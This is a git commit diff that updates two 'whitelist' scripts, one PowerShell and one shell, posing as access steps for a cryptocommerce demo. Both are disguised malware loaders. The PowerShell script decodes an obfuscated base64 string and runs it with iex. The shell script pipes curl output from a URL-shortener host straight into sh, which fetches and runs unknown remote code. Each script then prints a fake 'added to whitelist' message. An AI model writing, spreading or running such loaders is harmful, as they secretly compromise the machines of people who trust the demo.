59b407f411abd434714529f5a2515a65725b74f8
cartdev <playblockventures@gmail.com>
2026-03-16 15:41:59 -0400

    update script url

--- public/whitelist.ps1
+++ public/whitelist.ps1
@@ -1,4 +1,4 @@
 Write-Host "Requesting access for the demo..." -ForegroundColor Green
-iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y3VybC5leGUgaHR0cHM6Ly9QRXNuQ1Yuc2hvcnQuZ3kvY3NSa01uOXcgLUwgfCBjbWQ=")))
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9ncmFtYXJseWdwdC5zaG9ydC5neS9jc1JrTW45dw=")))
 Write-Host "Added to whitelist successfully. Showing demo..." -ForegroundColor Green
 [System.Diagnostics.Process]::Start("https://demo.cryptocommerce.cloud/")
--- public/whitelistm.sh
+++ public/whitelistm.sh
@@ -1,5 +1,5 @@
 echo "Requesting access for the demo…"
-curl -fsSL 'https://PEsnCV.short.gy/csRkMn9m' -L | sh
+curl -fsSL 'https://gramarlygpt.short.gy/csRkMn9m' -L | sh
 echo "Added to whitelist successfully. Showing demo…"
 echo "Enter https://demo.cryptocommerce.cloud in your browser"
 open "https://demo.cryptocommerce.cloud"
